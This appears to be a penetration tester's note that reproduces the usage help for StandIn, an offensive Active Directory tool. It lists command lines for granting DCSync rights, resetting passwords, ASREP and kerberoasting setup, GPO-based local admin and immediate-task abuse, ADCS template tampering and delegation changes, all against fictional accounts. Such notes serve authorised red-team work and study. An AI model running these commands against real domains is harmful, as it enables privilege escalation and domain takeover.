# Standin

[Standin](https://github.com/FuzzySecurity/StandIn) tool discussed in [Payload and the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#exploit-group-policy-objects-gpo). b33f is awesome and this method is significantly less time consuming than many alternative. The README.md is huge. For more of a memory aid as to what Standin can do I copied the usage to here, but the [README](https://github.com/FuzzySecurity/StandIn) contains the following internal links speedier navigation that scroll-wheel-goodbye-finger-joint README from hell:
- [LDAP Object Operations](https://github.com/FuzzySecurity/StandIn#ldap-object-operations)
    - [Raw LDAP](https://github.com/FuzzySecurity/StandIn#raw-ldap)
    - [Get object](https://github.com/FuzzySecurity/StandIn#get-object)
    - [Get object access permissions](https://github.com/FuzzySecurity/StandIn#get-object-access-permissions)
    - [Grant object access permission](https://github.com/FuzzySecurity/StandIn#grant-object-access-permission)
    - [Set object password](https://github.com/FuzzySecurity/StandIn#set-object-password)
    - [Add ASREP to object flags](https://github.com/FuzzySecurity/StandIn#addremove-asrep-from-object-flags)
    - [Remove ASREP from object flags](https://github.com/FuzzySecurity/StandIn#addremove-asrep-from-object-flags)
- [SID](https://github.com/FuzzySecurity/StandIn#sid)
- [ASREP](https://github.com/FuzzySecurity/StandIn#asrep)
- [PASSWD_NOTREQD](https://github.com/FuzzySecurity/StandIn#passwd_notreqd)
- [SPN](https://github.com/FuzzySecurity/StandIn#spn)
    - [SPN Collection](https://github.com/FuzzySecurity/StandIn#spn-collection)
    - [Set SPN](https://github.com/FuzzySecurity/StandIn#set-spn)
- [Unconstrained / constrained / resource-based constrained delegation](https://github.com/FuzzySecurity/StandIn#unconstrained--constrained--resource-based-constrained-delegation)
- [DC's](https://github.com/FuzzySecurity/StandIn#dcs)
- [Trust](https://github.com/FuzzySecurity/StandIn#trust)
- [GPO Operations](https://github.com/FuzzySecurity/StandIn#gpo-operations)
    - [List GPO's](https://github.com/FuzzySecurity/StandIn#list-gpos)
    - [GPO add local admin](https://github.com/FuzzySecurity/StandIn#gpo-add-local-admin)
    - [GPO add user privilege](https://github.com/FuzzySecurity/StandIn#gpo-add-user-privilege)
    - [GPO add immediate task](https://github.com/FuzzySecurity/StandIn#gpo-add-immediate-task)
    - [GPO increase User / Computer version](https://github.com/FuzzySecurity/StandIn#gpo-increase-user--computer-version)
- [Policy](https://github.com/FuzzySecurity/StandIn#policy)
- [DNS](https://github.com/FuzzySecurity/StandIn#dns)
- [Groups Operations](https://github.com/FuzzySecurity/StandIn#groups-operations)
    - [List group membership](https://github.com/FuzzySecurity/StandIn#list-group-membership)
    - [Add / remove user from group](https://github.com/FuzzySecurity/StandIn#add--remove-user-from-group)
- [Machine Object Operations](https://github.com/FuzzySecurity/StandIn#machine-object-operations)
    - [Create machine object](https://github.com/FuzzySecurity/StandIn#create-machine-object)
    - [Disable machine object](https://github.com/FuzzySecurity/StandIn#disable-machine-object)
    - [Delete machine object](https://github.com/FuzzySecurity/StandIn#delete-machine-object)
    - [Add msDS-AllowedToActOnBehalfOfOtherIdentity](https://github.com/FuzzySecurity/StandIn#add-msds-allowedtoactonbehalfofotheridentity)
    - [Remove msDS-AllowedToActOnBehalfOfOtherIdentity](https://github.com/FuzzySecurity/StandIn#remove-msds-allowedtoactonbehalfofotheridentity)
- [Active Directory Certificate Services (ADCS)](https://github.com/FuzzySecurity/StandIn#active-directory-certificate-services-adcs)
    - [List](https://github.com/FuzzySecurity/StandIn#list)
    - [Client Authentication](https://github.com/FuzzySecurity/StandIn#client-authentication)
    - [ENROLLEE_SUPPLIES_SUBJECT](https://github.com/FuzzySecurity/StandIn#enrollee_supplies_subject)
    - [PEND_ALL_REQUESTS](https://github.com/FuzzySecurity/StandIn#pend_all_requests)
    - [Change Owner](https://github.com/FuzzySecurity/StandIn#change-owner)
    - [Add Write Permission](https://github.com/FuzzySecurity/StandIn#add-write-permission)
    - [Add Certificate-Enrollment Permission](https://github.com/FuzzySecurity/StandIn#add-certificate-enrollment-permission)
- [Detection](https://github.com/FuzzySecurity/StandIn#detection)
- [Special Thanks](https://github.com/FuzzySecurity/StandIn#special-thanks)

```powershell
  __
 ( _/_   _//   ~b33f
__)/(//)(/(/)  v1.4


 >--~~--> Args? <--~~--<

--help          This help menu
--object        LDAP filter, e.g. samaccountname=HWest
--ldap          LDAP filter, can return result collection
--filter        Filter results, varies based on function
--limit         Limit results, varies based on function, defaults to 50
--computer      Machine name, e.g. Celephais-01
--group         samAccountName, e.g. "Necronomicon Admins"
--ntaccount     User name, e.g. "REDHOOK\UPickman"
--sid           Dependent on context
--grant         User name, e.g. "REDHOOK\KMason"
--guid          Rights GUID to add to object, e.g. 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
--domain        Domain name, e.g. REDHOOK
--user          User name
--pass          Password
--newpass       New password to set for object
--gpo           List group policy objects
--acl           Show ACL's for returned GPO's
--localadmin    Add samAccountName to BUILTIN\Administrators for vulnerable GPO
--setuserrights samAccountName for which to add token rights in a vulnerable GPO
--tasktype      Immediate task type (user/computer)
--taskname      Immediate task name
--author        Immediate task author
--command       Immediate task command
--args          Immediate task command args
--target        Optional, filter for DNS name or NTAccount
--targetsid     Optional, provider user SID
--increase      Increment either the user or computer GPO version number for the AD object
--policy        Reads some account/kerberos properties from the "Default Domain Policy"
--dns           Performs ADIDNS enumeration, supports wildcard filters
--legacy        Boolean, sets DNS seach root to legacy (CN=System)
--forest        Boolean, sets DNS seach root to forest (DC=ForestDnsZones)
--passnotreq    Boolean, list accounts that have PASSWD_NOTREQD set
--type          Rights type: GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync
--spn           Boolean, list kerberoastable accounts
--setspn        samAccountName for which to add/remove an SPN
--principal     Principal name to add to samAccountName (e.g. MSSQL/VermisMysteriis)
--delegation    Boolean, list accounts with unconstrained / constrained delegation
--asrep         Boolean, list ASREP roastable accounts
--dc            Boolean, list all domain controllers
--trust         Boolean, list all trust relationships
--adcs          List all CA's and all published templates
--clientauth    Boolean, modify ADCS template to add/remove "Client Authentication"
--ess           Boolean, modify ADCS template to add/remove "ENROLLEE_SUPPLIES_SUBJECT"
--pend          Boolean, modify ADCS template to add/remove "PEND_ALL_REQUESTS"
--owner         Boolean, modify ADCS template owner
--write         Boolean, modify ADCS template, add/remove WriteDacl/WriteOwner/WriteProperty permission for NtAccount
--enroll        Boolean, modify ADCS template, add/remove "Certificate-Enrollment" permission for NtAccount
--add           Boolean, context dependent group/spn/adcs
--remove        Boolean, context dependent msDS-AllowedToActOnBehalfOfOtherIdentity/group/adcs
--make          Boolean, make machine; ms-DS-MachineAccountQuota applies
--disable       Boolean, disable machine; should be the same user that created the machine
--access        Boolean, list access permissions for object
--delete        Boolean, delete machine from AD; requires elevated AD access

 >--~~--> Usage? <--~~--<

# Perform LDAP search
StandIn.exe --ldap "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
StandIn.exe --ldap servicePrincipalName=* --domain redhook --user RFludd --pass Cl4vi$Alchemi4e --limit 10
StandIn.exe --ldap servicePrincipalName=* --filter "pwdlastset, distinguishedname, lastlogon" --limit 100

# Query object properties by LDAP filter
StandIn.exe --object "(&(samAccountType=805306368)(servicePrincipalName=*vermismysteriis.redhook.local*))"
StandIn.exe --object samaccountname=Celephais-01$ --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --object samaccountname=Celephais-01$ --filter "pwdlastset, serviceprincipalname, objectsid"

# Query object access permissions, optionally filter by NTAccount
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --access
StandIn.exe --object samaccountname=Rllyeh$ --access --ntaccount "REDHOOK\EDerby"
StandIn.exe --object samaccountname=JCurwen --access --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant object access permissions
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --type DCSync
StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
StandIn.exe --object samaccountname=SomeTarget001$ --grant "REDHOOK\MBWillett" --type GenericWrite --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Set object password
StandIn.exe --object samaccountname=SomeTarget001$ --newpass "Arkh4mW1tch!"
StandIn.exe --object samaccountname=BJenkin --newpass "Dr34m1nTh3H#u$e" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add ASREP to userAccountControl flags
StandIn.exe --object samaccountname=HArmitage --asrep
StandIn.exe --object samaccountname=FMorgan --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove ASREP from userAccountControl flags
StandIn.exe --object samaccountname=TMalone --asrep --remove
StandIn.exe --object samaccountname=RSuydam --asrep  --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all ASREP roastable accounts
StandIn.exe --asrep
StandIn.exe --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Return GPO objects, optionally wildcard filter and get ACL's
StandIn.exe --gpo --limit 20
StandIn.exe --gpo --filter admin --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --gpo --filter admin --acl --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add samAccountName to BUILTIN\Administrators for vulnerable GPO
StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen
StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add token rights to samAccountName in a vulnerable GPO
StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant "SeTcbPrivilege,SeDebugPrivilege"
StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant SeLoadDriverPrivilege --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add user/computer immediate task and optionally filter
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt"
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --target Rllyeh.redhook.local
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype user --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --target "REDHOOK\RBloch" --targetsid S-1-5-21-315358687-3711474269-2098994107-1106
StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Increment either the user or computer GPO version number for the AD object
StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype user
StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype computer --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Read Default Domain Policy
StandIn.exe --policy
StandIn.exe --policy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Perform ADIDNS searches
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List account that have PASSWD_NOTREQD set
StandIn.exe --passnotreq
StandIn.exe --passnotreq --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get user and SID from either a SID or a samAccountName
StandIn.exe --sid JCurwen
StandIn.exe --sid S-1-5-21-315358687-3711474269-2098994107-1105 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all kerberoastable accounts
StandIn.exe --spn
StandIn.exe --spn --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove SPN from samAccountName
StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --add
StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List all accounts with unconstrained & constrained delegation privileges
StandIn.exe --delegation
StandIn.exe --delegation --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Get a list of all domain controllers
StandIn.exe --dc

# Get a list of all trust relationships in the current domain
StandIn.exe --trust

# List members of group or list user group membership
StandIn.exe --group Literarum
StandIn.exe --group "Magna Ultima" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
StandIn.exe --group JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add user to group
StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --add
StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --add --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove user from group
StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --remove
StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# List CA's and all published templates, optionally wildcard filter on template name
StandIn.exe --adcs
StandIn.exe --adcs --filter Kingsport
StandIn.exe --adcs --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove "Client Authentication" from template pKIExtendedKeyUsage, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --clientauth --add
StandIn.exe --adcs --filter Kingsport --clientauth --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove "ENROLLEE_SUPPLIES_SUBJECT" from template msPKI-Certificate-Name-Flag, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ess --add
StandIn.exe --adcs --filter Kingsport --ess --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add/remove "PEND_ALL_REQUESTS" from template msPKI-Enrollment-Flag, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --pend --add
StandIn.exe --adcs --filter Kingsport --pend --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Change template owner, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --owner
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --owner --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant NtAccount WriteDacl/WriteOwner/WriteProperty, filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --write --add
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --write --remove  --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Grant NtAccount "Certificate-Enrollment", filter should contain the exact name of the template
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --enroll --add
StandIn.exe --adcs --filter Kingsport --ntaccount "REDHOOK\MBWillett" --enroll --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Create machine object
StandIn.exe --computer Innsmouth --make
StandIn.exe --computer Innsmouth --make --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Disable machine object
StandIn.exe --computer Arkham --disable
StandIn.exe --computer Arkham --disable --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Delete machine object
StandIn.exe --computer Danvers --delete
StandIn.exe --computer Danvers --delete --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Add msDS-AllowedToActOnBehalfOfOtherIdentity to machine object properties
StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543
StandIn.exe --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e

# Remove msDS-AllowedToActOnBehalfOfOtherIdentity from machine object properties
StandIn.exe --computer Miskatonic --remove
StandIn.exe --computer Miskatonic --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
```

## References

[Standin Github Repository](https://github.com/FuzzySecurity/StandIn)